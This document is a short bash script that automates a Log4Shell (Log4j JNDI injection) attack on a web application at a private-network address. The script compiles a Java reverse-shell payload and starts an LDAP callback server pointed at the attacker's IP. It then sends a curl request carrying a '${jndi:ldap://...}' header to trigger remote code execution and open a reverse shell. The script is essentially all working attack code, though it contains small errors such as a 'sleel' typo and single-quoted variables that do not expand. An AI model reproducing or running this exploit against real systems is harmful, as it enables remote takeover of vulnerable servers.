#!/bin/bash

attacker_ip="<set IP>"
vulnerable_url="http://192.168.164.131:8080/vulnapp/api/vulnerable/user"
reverse_shell="." #Do not include file extention, e.g. '/home/user/folder/ReverseShell'

echo 'Executing in 10 seconds'
echo 'Make sure you start your callback listener...'
sleep 10

echo '   [+] Compiling reverse shell payload ...'
javac -source 1.7 -target 1.7 $reverse_shell.java -Xlint:-options

echo
echo '   [+] Reverse shell compiled ...'
sleep 1

echo
echo '   [+] Starting LDAP server listener ...'
python3 /path/to/log4rce.py --java_class $reverse_shell.class --ldap_rhost "$attacker_ip" --http_rhost "$attacker_ip" &
py_pid=$! # saving PID to kill processes later
sleep 3

echo
echo '   [+] Triggering Log4j exploit ...'
curl -A '${jndi:ldap://$attacker_ip:1387/ReverseShell}' $vulnerable_url
curl_pid=$!

echo
echo
echo '   [+] Log4j exploit sent, check for reverse shell.'

echo ' Attempting to kill associated scripts ...'
kill -9 $py_pid `expr $py_pid +2` `expr $py_pid + 3`
sleep 1

echo
echo 'Be sure to cleanup manually if there were any errors during the cleanup above'
sleel 1

echo
echo 'Killing curl process ...'
kill -9 $curl_pid